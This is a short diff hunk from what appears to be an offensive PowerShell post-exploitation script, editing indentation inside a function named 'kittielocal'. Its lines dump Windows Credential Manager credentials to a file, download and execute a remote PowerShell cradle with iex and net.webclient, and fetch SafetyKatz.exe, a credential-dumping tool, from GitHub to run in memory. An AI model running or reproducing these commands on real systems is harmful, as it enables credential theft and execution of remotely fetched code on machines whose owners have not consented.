@@ -409,9 +409,8 @@ function kittielocal
             {
                 Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-		        Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
 		   
-		}
             }
             else
             {
